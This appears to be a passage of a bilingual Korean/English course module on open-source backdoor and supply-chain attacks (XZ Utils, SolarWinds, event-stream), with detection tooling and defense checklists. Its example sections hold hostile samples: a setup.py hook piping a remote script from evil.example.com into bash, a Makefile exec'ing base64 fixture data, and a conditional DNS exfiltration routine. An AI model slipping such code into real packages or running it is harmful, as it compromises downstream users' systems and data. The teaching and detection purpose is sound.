            continue

        # 새 헝크(hunk) 시작: 라인 번호 재설정
        if line.startswith("@@"):
            match = re.search(r"\+(\d+)", line)
            line_num = int(match.group(1)) if match else 0
            continue

        # "+" 로 시작하는 줄만 검사 (추가된 코드)
        if not line.startswith("+") or line.startswith("+++"):
            if not line.startswith("+"):
                line_num += 1
            continue

        content = line[1:]  # "+" 접두사 제거

        # CRITICAL 패턴 검사
        for name, pattern in CRITICAL_PATTERNS.items():
            if pattern.search(content):
                findings.append(SecurityFinding(
                    severity="CRITICAL",
                    file_path=current_file,
                    line_number=line_num,
                    pattern_name=name,
                    line_content=content.strip()[:100],
                ))

        # MEDIUM 패턴 검사
        for name, pattern in MEDIUM_PATTERNS.items():
            if pattern.search(content):
                findings.append(SecurityFinding(
                    severity="MEDIUM",
                    file_path=current_file,
                    line_number=line_num,
                    pattern_name=name,
                    line_content=content.strip()[:100],
                ))

        line_num += 1

    return findings


def check_sensitive_files(diff_text: str) -> list[str]:
    """수정된 고위험 파일 목록 반환 — 빌드 스크립트, CI/CD 설정 등"""
    modified_sensitive: list[str] = []

    for line in diff_text.splitlines():
        if line.startswith("diff --git"):
            match = re.search(r"b/(.+)$", line)
            if match:
                filepath = match.group(1)
                for pattern in SENSITIVE_FILE_PATTERNS:
                    if re.search(pattern, filepath):
                        modified_sensitive.append(filepath)

    return list(set(modified_sensitive))


def check_binary_files(diff_text: str) -> list[str]:
    """추가/수정된 바이너리 파일 탐지 — 숨겨진 페이로드 가능성"""
    binary_files: list[str] = []

    for line in diff_text.splitlines():
        # git diff에서 바이너리 파일 표시
        if "Binary files" in line and "/dev/null" not in line:
            match = re.search(r"b/(.+) differ", line)
            if match:
                binary_files.append(match.group(1))

    return binary_files


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Git Security Analyzer — 커밋/PR의 보안 위험 분석",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  %(prog)s --repo . --base main --head feature-branch
  %(prog)s --repo . --commit abc1234
  %(prog)s --repo . --base HEAD~5 --head HEAD
        """,
    )
    parser.add_argument("--repo", type=Path, default=Path("."),
                        help="분석할 git 레포지토리 경로 (기본값: 현재 디렉토리)")
    parser.add_argument("--base", default="main",
                        help="비교 기준 브랜치/커밋 (기본값: main)")
    parser.add_argument("--head", default="HEAD",
                        help="분석 대상 브랜치/커밋 (기본값: HEAD)")
    parser.add_argument("--commit",
                        help="단일 커밋 분석 (--base/--head 대신 사용)")
    parser.add_argument("--json", action="store_true",
                        help="JSON 형식으로 출력 (CI 통합용)")

    args = parser.parse_args()

    if args.commit:
        diff = get_diff(args.repo, f"{args.commit}^", args.commit)
        print(f"[*] 커밋 분석: {args.commit}")
    else:
        diff = get_diff(args.repo, args.base, args.head)
        print(f"[*] 브랜치 비교: {args.base}...{args.head}")

    findings = analyze_diff(diff)
    sensitive_files = check_sensitive_files(diff)
    binary_files = check_binary_files(diff)

    # 바이너리 파일 경고 (XZ Utils 스타일 공격 탐지)
    if binary_files:
        print(f"\n[경고] 바이너리 파일 변경 감지 (은닉 페이로드 가능성):")
        for f in binary_files:
            print(f"  - {f}")

    # 고위험 파일 경고
    if sensitive_files:
        print(f"\n[경고] 수정된 민감 파일 (빌드/CI 스크립트):")
        for f in sensitive_files:
            print(f"  - {f}")

    critical = [f for f in findings if f.severity == "CRITICAL"]
    medium = [f for f in findings if f.severity == "MEDIUM"]

    print(f"\n보안 발견사항: 심각 {len(critical)}개, 중간 {len(medium)}개")

    if critical:
        print(f"\n[심각 (CRITICAL)]:")
        for f in critical:
            print(f"  [{f.pattern_name}] {f.file_path}:{f.line_number}")
            print(f"    {f.line_content}")

    if medium:
        print(f"\n[중간 (MEDIUM)] (상위 10개):")
        for f in medium[:10]:
            print(f"  [{f.pattern_name}] {f.file_path}:{f.line_number}")
            print(f"    {f.line_content}")

    # 심각 발견사항이 있으면 비정상 종료 (CI 파이프라인에서 빌드 실패)
    sys.exit(1 if critical else 0)


if __name__ == "__main__":
    main()
```

---

## 7. 방어 체크리스트

### 7.1 오픈소스 기여자 관리

- [ ] 새 기여자의 이전 기여 이력 검토 (최소 3개월 이상)
- [ ] 메인테이너 권한 부여 시 여러 기존 메인테이너의 동의 필요
- [ ] 크리티컬한 변경사항(빌드 스크립트, CI/CD, 암호화)은 여러 명이 독립적으로 리뷰
- [ ] 봇/가짜 계정이 압박하는 패턴 인식 (기여자 계정의 생성일, 이력 확인)
- [ ] 갑작스러운 인수 요청에 주의 ("내가 관리해줄게요")

### 7.2 빌드/배포 보안

- [ ] Reproducible Builds 적용 — 동일 소스에서 동일 바이너리
- [ ] tarball과 git 소스 비교 — 배포 패키지에 소스에 없는 파일이 있는지 확인
- [ ] CI/CD 파이프라인 최소 권한 (필요한 권한만)
- [ ] 외부 GitHub Actions에 SHA 핀닝
- [ ] 코드 서명 (Sigstore/cosign) — 빌드 결과물의 신뢰성 보장
- [ ] 의존성 잠금 파일 사용 (package-lock.json, requirements.txt, Cargo.lock)

### 7.3 탐지

- [ ] 바이너리 파일이 test/ 또는 data/ 디렉토리에 추가되는 경우 알림
- [ ] 빌드 스크립트(.m4, Makefile, setup.py) 변경 시 강화된 리뷰
- [ ] 런타임 행동 분석 (eBPF 기반 Falco, Tetragon 등)
- [ ] SBOM 생성 및 취약점 스캔 자동화
- [ ] 의존성 버전 고정 + 해시 검증

### 7.4 공격 기법별 탐지 방법 요약

| 공격 기법 | 탐지 방법 |
|-----------|-----------|
| Typosquatting | 패키지 이름 유사도 검사, 새 의존성 추가 시 리뷰 |
| 의존성 혼동 | 내부 패키지를 공개 레지스트리에서도 예약, 버전 범위 명시 |
| 메인테이너 탈취 | 2FA 강제, 배포 전 다중 승인, 이상 배포 알림 |
| Trojan Source | 유니코드 제어 문자 grep, 에디터 가시화 설정 |
| 빌드 스크립트 백도어 | tarball vs git diff, 빌드 스크립트 변경 시 강화 리뷰 |
| CI/CD 오염 | Actions SHA 핀닝, pull_request_target 사용 금지 |
| XZ 스타일 | liblzma IFUNC 분석, 재현 가능 빌드, 바이너리 테스트 파일 감지 |
| SolarWinds 스타일 | 빌드 환경 격리, 빌드 결과물 서명/검증, SLSA 준수 |

---

<!-- detect-validate-35 -->
## 오픈소스 백도어 탐지와 변경 출처 검증

오픈소스 백도어는 *신뢰 확보 후 악성 커밋·GHA 워크플로 오염·빌드 단계 난독화·컴파일러 백도어("Trusting Trust")*로 소스에 안 보이는 악성코드를 넣는다. 방어자는 **배포 산출물이 검토된 소스에서 재현가능하게 생성됐는가**를 검증해야 한다. 검증은 **소유 리포/빌드**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| 신뢰 후 백도어 | 메인테이너 신뢰 | 다중 리뷰·서명 커밋 | 단독 머지·미서명 커밋 |
| 빌드 단계 난독화 | 산출물≠소스 | 재현가능 빌드 | 빌드 산출물 diff |
| GHA 워크플로 오염 | CI가 소스 변형 | 워크플로 리뷰·핀 | 빌드 중 소스 패치 |
| 컴파일러 백도어 | 신뢰된 툴체인 | 부트스트랩·diverse 컴파일 | 동일소스 다른 바이너리 |

### 방어 검증 (직접 확인)

```bash
# 1) 배포 tarball이 git 소스와 일치하는지(소스↔산출물 diff) — 추가/변형 파일이 백도어 신호
diff -r <(git archive HEAD | tar -t | sort) <(tar -tzf dist-release.tgz | sed 's#^[^/]*/##' | sort) 2>/dev/null | head
# 2) 미서명/단독 머지 커밋 표면(소유 리포) — 리뷰 우회 백도어 경로
git log --no-merges --pretty='%h %G? %an %s' -20 | grep -vE ' [GU] ' | head
```

> 오픈소스 방어는 *산출물이 검토된 소스에서 나왔는가*다 — "빌드된다"와 "tarball이 git 소스와 일치하고 커밋이 서명·리뷰됐으며 빌드가 재현가능하다"는 다르다. 소유 리포/빌드에서 변경 출처를 직접 확인한다([[74_Code_Auditing]], [[18_DevSecOps]], [[59_Supply_Chain_Security]]).

**최신 기법·통제 (2025–2026):**
- 유지보수자 탈취·난독 백도어(xz류)가 위협 — 코드리뷰·서명·행위 이상탐지로 방어. 검증: 의심 커밋/빌드 아티팩트가 탐지되는가([[74_Code_Auditing]])
- 프로버넌스·리뷰 게이트 — 강제되는지 확인

---

<a name="english"></a>

# Open Source Backdoor Insertion Techniques

> **Learning Objectives**
>
> After completing this document, you will be able to:
> 1. Explain what a software supply chain is and why it is vulnerable
> 2. Distinguish the five supply chain attack types and cite a real case for each
> 3. Describe the XZ Utils backdoor (CVE-2024-3094) attack method and how it was detected
> 4. Practice detecting hidden backdoors during code review
> 5. Apply defense techniques including SBOM, dependency scanning, and SHA pinning

---

## 0. What Is a Software Supply Chain?

### 0.1 Modern Software Is Assembled from Parts

Modern software development does not build everything from scratch. Just as an automaker sources tires, engines, and glass from separate suppliers and assembles them, developers pull in **open source libraries** and combine them.

```
Car assembly analogy:
  Toyota         = Final product (the vehicle)
  Tire supplier A, Engine supplier B, Glass supplier C = Component vendors

If tire supplier A ships defective tires?
  → Every completed Toyota vehicle is affected.

Software supply chains work the same way:
  Your app     = Final product
  numpy, requests, lodash, log4j = Open source components

If an attacker plants malicious code in "requests"?
  → Every project using requests (millions of them) is infected.
```

### 0.2 The Scale of Modern Dependencies

Real numbers show how complex this has become:

- **npm (JavaScript)**: more than 2.4 million packages in the registry
- **PyPI (Python)**: more than 500,000 packages
- **Maven (Java)**: millions of artifacts

A simple Node.js app can pull in **hundreds to thousands** of libraries when `npm install` runs. If even one of them is compromised, the whole project is at risk.

```bash
# Inspect dependency tree
npm ls --depth=0    # Direct dependencies only
npm ls              # Full dependency tree

# Python
pip show requests   # See what requests itself depends on
pipdeptree          # Full tree
```

### 0.3 Why Supply Chain Attacks Work

```
Traditional hacking:
  "Rob the bank directly" → Heavy security, very hard

Supply chain attack:
  "Take control of the cleaning company the bank uses every day"
  → Cleaners walk in freely every morning
  → The bank's strong perimeter security is bypassed entirely

In software:
  Companies ship far more open source dependency code than their own code
  Security audits focus on first-party code
  Dependencies are implicitly trusted
  → Supply chain attacks slip through
```

---

## 1. Supply Chain Attack Type Classification

### 1.1 Typosquatting

**Principle:** Register a malicious package under a name that is visually similar to a popular one.

```
Legitimate:  requests  (Python HTTP library, 200M+ downloads/month)
Malicious:   reqests   (one letter swapped)
             request   (singular)
             requestss (doubled letter)
             requets   (transposed letters)
```

If a developer mistyps the package name, or autocomplete misbehaves, the malicious package gets installed instead.

**Real case (2017):**
Seventeen Python typosquatting packages were discovered on PyPI. Several contained cryptocurrency wallet-stealing code.

### 1.2 Dependency Confusion

**Principle:** Register a public package with the same name as a company's internal private package, but with a higher version number.

```
Company's internal package registry:
  "mycompany-utils" version 1.0.0

Attacker registers on public PyPI:
  "mycompany-utils" version 9.9.9

Package manager behavior:
  pip install mycompany-utils
  → Finds higher version 9.9.9 on the public registry
  → Installs the attacker's malicious package
```

**Real case (2021):** Security researcher Alex Birsan used this technique to successfully penetrate internal systems at Apple, Microsoft, PayPal, and 32 other companies. He collected over $100,000 in bug bounty rewards.

### 1.3 Compromised Maintainer

**Principle:** Hack the account of a trusted open source project maintainer and use it to legitimately distribute malicious code.

```
How attackers gain access:
1. Phishing email steals npm/PyPI credentials
2. Reused passwords obtained from other data breaches
3. Brute-force attack on accounts without 2FA
4. Social engineering to bypass account recovery
```

**Real case — event-stream (2018):**

```
Background:
  event-stream: Node.js stream processing utility
  Millions of weekly downloads; used by Bitcoin-related apps

Attack sequence:
  1. Attacker "right9ctrl" approached original maintainer "dominictarr"
  2. Offered: "If you no longer maintain this, I'll take it over"
  3. dominictarr transferred npm publishing rights (for free)
  4. right9ctrl added the malicious "flatmap-stream" dependency
  5. flatmap-stream contained obfuscated Copay Bitcoin wallet theft code
  6. Millions of installs → targeted Copay users with large balances

Discovery:
  Developer spotted it in GitHub Issue #116:
  "Why does this package contain cryptocurrency-related code?"
```

### 1.4 Malicious Pull Request

**Principle:** Submit a pull request to a legitimate open source project that includes backdoor code hidden among innocent-looking changes.

```
Process:
1. Submit a legitimate bug-fix PR to build trust
2. Make multiple genuine contributions; earn maintainer confidence
3. Submit a PR with obfuscated malicious code embedded
4. Maintainer merges it without thorough scrutiny
5. Next release ships the malicious code to all users
```

**The XZ Utils case is the most extreme example of this pattern** — the attacker spent over two years building trust.

### 1.5 Build System Compromise

**Principle:** The source code is clean, but malicious code is injected during the build or compilation process.

```
Source code → [Build system] → Distributed binary

If the build system is compromised:
  Audited source code: clean
  Actual distributed binary: contains malicious code

→ No source audit can ever find it
```

**The SolarWinds case is the canonical example of this pattern.**

---

## 2. Real-World Case Studies

### 2.1 event-stream (2018) — npm Ecosystem Attack

See the type classification section above for the full story. Key technical detail:

```javascript
// Malicious code inside flatmap-stream (de-obfuscated version)
// The original was AES-256 encrypted
var crypto = require('crypto');

// Only activates when running inside the Copay wallet app
// (checks package name to identify the target)
var app = require('/path/to/copay/app');
if (app && app.bitcore) {
    // Exfiltrates wallet private keys and balance info to remote server
    // Condition: balance > 100 BTC or > 1000 BCH
}
```

### 2.2 SolarWinds (2020) — Build Pipeline Compromise

**Background:**
- SolarWinds Orion: IT monitoring software used by thousands of enterprises and government agencies
- Customers included U.S. State Department, Treasury, Defense Department, and many Fortune 500 companies

**Attack method:**

```
Attackers (later attributed to Russian SVR):
  1. Infiltrated SolarWinds build environment (around October 2019)
  2. Infected build servers with SUNSPOT malware
  3. SUNSPOT automatically injected SUNBURST backdoor into Orion during compilation
  4. Code signing passed successfully — signed binaries look legitimate
  5. March–June 2020: ~18,000 infected update packages distributed
  6. Backdoor stayed dormant for 2 weeks before activating (evades detection)
  7. December 2020: discovered by cybersecurity firm FireEye
```

**SUNBURST backdoor characteristics:**
```
- 12–14 days of inactivity after install (evades initial detection)
- C2 communication via DNS (blends with normal traffic)
- Disguised to look like normal SolarWinds traffic patterns
- Auto-deactivates if security products are detected
- Analyzes environment to selectively target high-value systems
```

### 2.3 XZ Utils (2024) — CVE-2024-3094

#### Detailed Attack Timeline

```
October 2021:
  Jia Tan (@JiaT75) account created
  Begins contributing minor bug fixes to xz-utils
  → Nothing suspicious; contributions look entirely legitimate

2022:
  Steady legitimate contributions (translations, tests, optimizations)
  Responds quickly to review requests, provides high-quality patches
  Fake accounts like "Jigar Kumar" begin pressuring existing maintainer
  Lasse Collin with messages like: "You aren't maintaining this properly"

2023:
  Jia Tan obtains co-maintainer privileges
  Extends trust-building to adjacent projects (oss-fuzz, libarchive)

February 2024:
  xz-utils 5.6.0 released
  Malicious code NOT in git source — only in the distributed tarball
  build-to-host.m4 build script extracts/injects malicious code from
  binary files hidden in the tarball

March 29, 2024:
  Microsoft engineer Andres Freund notices SSH logins on Debian Sid
  are ~500ms slower than expected
  Uses valgrind to find anomalies in liblzma
  CVE-2024-3094 publicly disclosed

Attack objective:
  systemd → libsystemd → liblzma loads into sshd
  An SSH authentication attempt using a specially crafted RSA key
  (signed with attacker's ED448 private key) skips real authentication
  and allows arbitrary command execution
```

#### Backdoor Insertion Technique (Technical Details)

```bash
# Malicious payload locations in the tarball
tests/files/bad-3-corrupt_lzma2.xz    # Binary payload
tests/files/good-large_compressed.lzma # Another binary payload

# build-to-host.m4 extracts and injects the payload during configure
# Result: malicious object file linked into liblzma.a

# Detecting vulnerable installations
xz --version | grep -E "^xz \(XZ Utils\) 5\.6\."
strings /usr/lib/x86_64-linux-gnu/liblzma.so.5 | grep "5.6"
```

```c
// Backdoor mechanics (simplified overview)
// Actual code was deeply obfuscated inside IFUNC resolvers

// 1. Malicious IFUNC resolver runs when liblzma loads
// 2. Hooks sshd's RSA_public_decrypt function
// 3. Monitors every SSH authentication attempt
// 4. When an RSA key with a specific structure arrives:
//    - Skips the real RSA verification
//    - Validates a command encoded in the key using ED448 signature
//    - If validation passes: executes the command as root

// Evasion techniques used:
// 1. Malicious code only in tarball binary, not in git source
// 2. Binary payloads disguised as test fixture files
// 3. Multi-stage obfuscated build script
// 4. Activates only on: systemd + OpenSSH + x86_64 Linux
// 5. 2-week delay — does not connect immediately after install
```

**Why it was so hard to detect:**
```
1. Source code audit finds nothing (malicious code only in distributed binary)
2. Very specific activation conditions (systemd + sshd + x86_64 + specific distros)
3. Does not activate in test / CI environments
4. Distributed by an account with 2+ years of trusted contributions
5. Crypto/signature verification code that "looks like normal assembly"
```

### 2.4 Colors.js / Faker.js Sabotage (2022)

**This was not an external attack — it was deliberate sabotage by the maintainer himself.**

```
Background:
  Marak Squires: sole maintainer of colors.js (20M+ weekly downloads)
  and faker.js
  Grievance: "Large corporations use my open source for free without contributing"

The sabotage:
  January 7, 2022: Released colors.js version 1.4.44-liberty-2
                   and faker.js version 6.6.6

Malicious behavior:
  Infinite loop printing "LIBERTY LIBERTY LIBERTY" to the terminal
  Followed by an ASCII art flag

Impact:
  Thousands of projects depending on colors.js crashed
  Major projects affected: AWS CDK, Jest, and many others
  npm reverted the malicious versions and suspended the account

Message:
  "I am no longer going to support Fortune 500 companies for free.
   Either offer a six-figure salary contract or fork the project."
```

**Lesson:** Supply chain security threats come not only from external attackers but also from **the legitimate maintainer themselves**. Version locking with `package-lock.json`, `pip hash`, and integrity checks is essential.

---

## 3. Hiding Backdoors in Code

### 3.1 Technique 1: Trojan Source — Unicode Control Characters

```python
# CVE-2021-42574: Bidirectional Unicode control characters make code
# appear different to human reviewers versus the compiler/interpreter

# Right-to-Left Override (U+202E) can flip the visual order of tokens
# What a reviewer sees:   if user.is_admin:  # check if admin
# What actually executes: the logic is reversed by the invisible character

# Detection: scan for dangerous Unicode codepoints
import re

def detect_trojan_source(code: str) -> list[int]:
    """Detect Unicode control characters used in Trojan Source attacks"""
    dangerous_chars = [
        '‪',  # Left-to-Right Embedding
        '‫',  # Right-to-Left Embedding
        '‬',  # Pop Directional Formatting
        '‭',  # Left-to-Right Override
        '‮',  # Right-to-Left Override  ← most dangerous
        '⁦',  # Left-to-Right Isolate
        '⁧',  # Right-to-Left Isolate
        '⁨',  # First Strong Isolate
        '⁩',  # Pop Directional Isolate
        '‏',  # Right-to-Left Mark
    ]
    suspicious_lines: list[int] = []
    for i, line in enumerate(code.splitlines(), 1):
        for char in dangerous_chars:
            if char in line:
                suspicious_lines.append(i)
                break
    return suspicious_lines


# Shell command to scan an entire codebase
# grep -rn $'‮‭‬‫‪' .
```

### 3.2 Technique 2: Conditional Activation

```python
# The backdoor only activates when multiple specific conditions are
# simultaneously true. Each individual condition looks harmless.
import os
import time
import hashlib


def legitimate_data_processor(data: bytes) -> bytes:
    """A function that looks like normal data processing"""
    result = hashlib.sha256(data).digest()
    _check_environment(data)   # Innocuous-looking helper call
    return result


def _check_environment(data: bytes) -> None:
    """Hidden conditional — each condition appears innocent on its own"""
    is_production = os.getenv("CI") is None         # Not a CI environment
    is_late_month = int(time.strftime("%d")) > 20   # After the 20th of the month
    has_ssh = os.path.exists("/var/run/sshd.pid")   # SSH daemon is running
    is_root = os.getuid() == 0                      # Running as root

    if is_production and is_late_month and has_ssh and is_root:
        _exfiltrate(data)


def _exfiltrate(data: bytes) -> None:
    """Data exfiltration via DNS (bypasses most firewalls)"""
    import socket
    try:
        encoded = data[:32].hex()
        # Encode data in a DNS lookup subdomain — hard to detect in logs
        socket.gethostbyname(f"{encoded}.malicious.example.com")
    except Exception:
        pass  # Fail silently
```

### 3.3 Technique 3: Hiding in Build Scripts

```bash
# Malicious Makefile — looks like a simple test runner at first glance
check:
	@python3 -c "import base64; exec(base64.b64decode(open('tests/fixtures/data.bin').read()))"
	@echo "All tests passed"
```

```python
# Abusing setup.py install hooks
from setuptools import setup
from setuptools.command.install import install
import subprocess

class PostInstallCommand(install):
    def run(self) -> None:
        install.run(self)
        # Runs automatically after pip install
        # Downloads and executes a remote script
        subprocess.run(
            "curl -s https://evil.example.com/init.sh | bash",
            shell=True
        )

setup(
    name='legitimate-looking-package',
    cmdclass={'install': PostInstallCommand},
)
```

---

## 4. GitHub Actions Workflow Poisoning

### 4.1 Attack Path: CI/CD Pipeline Takeover

```yaml
# Vulnerable workflow: pull_request_target + checking out PR code
name: CI (Vulnerable)
on:
  pull_request_target:  # DANGEROUS: runs fork PRs with the base repo's permissions
                        # Fork PR code gets access to secrets, write GITHUB_TOKEN

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checks out attacker's code
      - run: npm ci
      - run: npm test  # Attacker's postinstall script in package.json can
                       # steal CI secrets via environment variables
```

### 4.2 Secure CI/CD Configuration

```yaml
# Safe workflow: use pull_request (no secrets in fork context)
name: CI (Safe)
on:
  pull_request:  # External fork PRs run without secrets, read-only token only

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read        # Explicitly grant only what is needed
      pull-requests: read
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

### 4.3 Third-Party Actions Supply Chain Attacks

```yaml
# Vulnerable: tag reference (attacker can move the tag to a different commit)
- uses: actions/some-action@v1

# Vulnerable: branch reference (code changes at any time)
- uses: some-org/some-action@main

# Safe: pin to a specific commit SHA (immutable)
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

```yaml
# .github/dependabot.yml — automatically keep Actions up to date
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    # SHA pinning + auto-updates = best of both worlds
```

---

## 5. Compiler Backdoor: Ken Thompson's "Trusting Trust"

The concept presented in Ken Thompson's 1984 Turing Award lecture — the philosophical foundation of supply chain attacks.

```c
/*
 * Meta-attack: planting a backdoor in the compiler itself
 *
 * Step 1: Add code to the compiler that injects a backdoor into
 *         the login program whenever it compiles login
 *
 * Step 2: Add code to the compiler that propagates this backdoor
 *         logic whenever the compiler compiles itself
 *
 * Step 3: Remove all malicious source from the compiler source code
 *
 * Result: The malicious logic lives only in the compiled compiler binary.
 *         No source code audit will ever find it.
 *         Compiling login with this compiler injects the backdoor.
 *         Recompiling the compiler with itself propagates the backdoor.
 */

// Pseudocode: logic hidden inside the compiler binary
void compile(char *source) {
    if (is_compiling("login")) {
        inject_backdoor();        // Backdoor: password "backdoor123" also grants access
    }
    if (is_compiling("cc")) {
        inject_self_replication(); // Propagate logic into the next compiler build
    }
    normal_compile(source);
}
```

**Defense: Reproducible Builds**

```bash
# Concept: the same source code must always produce the same binary.
# If two independent builds of the same source differ, the build system is compromised.

# Fix timestamps to make builds deterministic
export SOURCE_DATE_EPOCH=$(git log -1 --format=%ct)
make

# Compare two builds
sha256sum build1/myapp build2/myapp
# Must be identical

# diffoscope: detailed binary comparison
diffoscope build1/myapp build2/myapp
```

---

## 6. Detection Methods

### 6.1 Dependency Scanners

```bash
# npm vulnerability audit
npm audit
npm audit fix  # Auto-fix (note: major version upgrades need separate review)

# pip vulnerability check
pip-audit
# or
safety check

# Snyk (multi-language)
snyk test
snyk monitor  # Continuous monitoring

# OWASP Dependency-Check
dependency-check --project "MyApp" --scan ./ --out ./report
```

### 6.2 SBOM (Software Bill of Materials)

An SBOM is a complete inventory of every component in a software product — analogous to a manufacturing Bill of Materials.

```bash
# Generate SBOM in SPDX format
syft /path/to/project -o spdx-json > sbom.spdx.json

# Generate SBOM in CycloneDX format
syft /path/to/project -o cyclonedx-json > sbom.cdx.json

# Scan SBOM for known vulnerabilities
grype sbom:./sbom.spdx.json

# Generate SBOM for a Docker image
syft docker:myapp:latest -o spdx-json > sbom.spdx.json
```

### 6.3 Git Diff Security Analyzer (Python)

```python
#!/usr/bin/env python3
"""
Git Security Analyzer — detect security risk indicators in PR/commit diffs

Usage:
  python3 git_security.py --repo . --base main --head feature-branch
  python3 git_security.py --repo . --commit abc1234
  python3 git_security.py --repo . --base HEAD~5 --head HEAD
"""

import argparse
import re
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path


# Critical patterns — immediate detailed review required on any match
CRITICAL_PATTERNS = {
    "Eval/Exec call":      re.compile(r"\b(eval|exec)\s*\(", re.IGNORECASE),
    "Base64 exec":         re.compile(r"base64[^;]*decode[^;]*exec|exec[^;]*base64", re.IGNORECASE),
    "Shell execution":     re.compile(r"subprocess\.(?:call|run|Popen)|os\.system|os\.popen"),
    "Socket connection":   re.compile(r"socket\.connect\b|socket\.create_connection"),
    "Trojan Source chars": re.compile(r"[‪-‮⁦-⁩‏‎]"),
    "Direct memory access": re.compile(r"ctypes\.(cdll|windll|CDLL)|mmap\.mmap"),
}

# Medium-risk patterns — may be legitimate depending on context; review needed
MEDIUM_PATTERNS = {
    "External HTTP request": re.compile(r"urllib\.request|requests\.(get|post)|http\.client"),
    "Execute permission":    re.compile(r"os\.chmod.*0o[7][5-7][5-7]|chmod.*\+x"),
    "Environment variable":  re.compile(r"os\.environ\b|os\.getenv\b"),
    "DNS lookup":            re.compile(r"socket\.gethostbyname|socket\.getaddrinfo"),
    "Crypto library import": re.compile(r"import\s+(?:Crypto|cryptography|nacl|bcrypt)"),
}

# File path patterns that warrant enhanced review when modified
SENSITIVE_FILE_PATTERNS = [
    r"\.github/workflows/",
    r"setup\.py$",
    r"Makefile$",
    r"configure\.ac$",
    r"\.m4$",             # Used in the XZ Utils attack
    r"CMakeLists\.txt$",
    r"Dockerfile$",
    r"/\.travis\.yml$",
]


@dataclass
class SecurityFinding:
    severity: str
    file_path: str
    line_number: int
    pattern_name: str
    line_content: str


def get_diff(repo_path: Path, base: str, head: str) -> str:
    result = subprocess.run(
        ["git", "-C", str(repo_path), "diff", base, head],
        capture_output=True,
        text=True,
        timeout=60,
        errors="replace",
    )
    return result.stdout


def analyze_diff(diff_text: str) -> list[SecurityFinding]:
    """Scan added lines in the diff for security risk patterns"""
    findings: list[SecurityFinding] = []
    current_file = ""
    line_num = 0

    for line in diff_text.splitlines():
        if line.startswith("diff --git"):
            match = re.search(r"b/(.+)$", line)
            current_file = match.group(1) if match else ""
            continue

        if line.startswith("@@"):
            match = re.search(r"\+(\d+)", line)
            line_num = int(match.group(1)) if match else 0
            continue

        if not line.startswith("+") or line.startswith("+++"):
            if not line.startswith("+"):
                line_num += 1
            continue

        content = line[1:]

        for name, pattern in CRITICAL_PATTERNS.items():
            if pattern.search(content):
                findings.append(SecurityFinding("CRITICAL", current_file,
                                                line_num, name, content.strip()[:100]))

        for name, pattern in MEDIUM_PATTERNS.items():
            if pattern.search(content):
                findings.append(SecurityFinding("MEDIUM", current_file,
                                                line_num, name, content.strip()[:100]))

        line_num += 1

    return findings


def check_sensitive_files(diff_text: str) -> list[str]:
    """Return list of high-risk files modified in the diff"""
    modified: list[str] = []
    for line in diff_text.splitlines():
        if line.startswith("diff --git"):
            match = re.search(r"b/(.+)$", line)
            if match:
                filepath = match.group(1)
                for pattern in SENSITIVE_FILE_PATTERNS:
                    if re.search(pattern, filepath):
                        modified.append(filepath)
    return list(set(modified))


def check_binary_files(diff_text: str) -> list[str]:
    """Detect binary files added or modified — possible hidden payload"""
    binary_files: list[str] = []
    for line in diff_text.splitlines():
        if "Binary files" in line and "/dev/null" not in line:
            match = re.search(r"b/(.+) differ", line)
            if match:
                binary_files.append(match.group(1))
    return binary_files


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Git Security Analyzer — detect security risks in commits/PRs",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --repo . --base main --head feature-branch
  %(prog)s --repo . --commit abc1234
  %(prog)s --repo . --base HEAD~5 --head HEAD
        """,
    )
    parser.add_argument("--repo", type=Path, default=Path("."),
                        help="Path to git repository (default: current directory)")
    parser.add_argument("--base", default="main",
                        help="Base branch/commit for comparison (default: main)")
    parser.add_argument("--head", default="HEAD",
                        help="Target branch/commit to analyze (default: HEAD)")
    parser.add_argument("--commit",
                        help="Analyze a single commit (alternative to --base/--head)")

    args = parser.parse_args()

    if args.commit:
        diff = get_diff(args.repo, f"{args.commit}^", args.commit)
        print(f"[*] Analyzing commit: {args.commit}")
    else:
        diff = get_diff(args.repo, args.base, args.head)
        print(f"[*] Comparing branches: {args.base}...{args.head}")

    findings = analyze_diff(diff)
    sensitive_files = check_sensitive_files(diff)
    binary_files = check_binary_files(diff)

    # Alert on binary file changes (XZ Utils-style attack detection)
    if binary_files:
        print(f"\n[WARNING] Binary file changes detected (possible hidden payload):")
        for f in binary_files:
            print(f"  - {f}")

    if sensitive_files:
        print(f"\n[WARNING] Sensitive files modified (build/CI scripts):")
        for f in sensitive_files:
            print(f"  - {f}")

    critical = [f for f in findings if f.severity == "CRITICAL"]
    medium = [f for f in findings if f.severity == "MEDIUM"]

    print(f"\nFindings: {len(critical)} critical, {len(medium)} medium")

    if critical:
        print(f"\n[CRITICAL]:")
        for f in critical:
            print(f"  [{f.pattern_name}] {f.file_path}:{f.line_number}")
            print(f"    {f.line_content}")

    if medium:
        print(f"\n[MEDIUM] (top 10):")
        for f in medium[:10]:
            print(f"  [{f.pattern_name}] {f.file_path}:{f.line_number}")
            print(f"    {f.line_content}")

    # Non-zero exit on critical findings → fails CI pipeline builds
    sys.exit(1 if critical else 0)


if __name__ == "__main__":
    main()
```

---

## 7. Defense Checklist

### 7.1 Open Source Contributor Management

- [ ] Review each new contributor's history before granting access (at least 3 months of activity)
- [ ] Require approval from multiple existing maintainers before granting write access
- [ ] For critical changes (build scripts, CI/CD, cryptography), require independent review by multiple people
- [ ] Recognize patterns of bot/fake account pressure ("why hasn't this been merged yet?")
- [ ] Be suspicious of sudden takeover offers ("I'd like to maintain this for you")

### 7.2 Build and Deployment Security

- [ ] Apply Reproducible Builds — same source must produce the same binary
- [ ] Compare tarball vs git source — check for files present in the release but absent from git
- [ ] Minimal CI/CD pipeline permissions — grant only what is needed
- [ ] Pin external GitHub Actions to specific commit SHA hashes
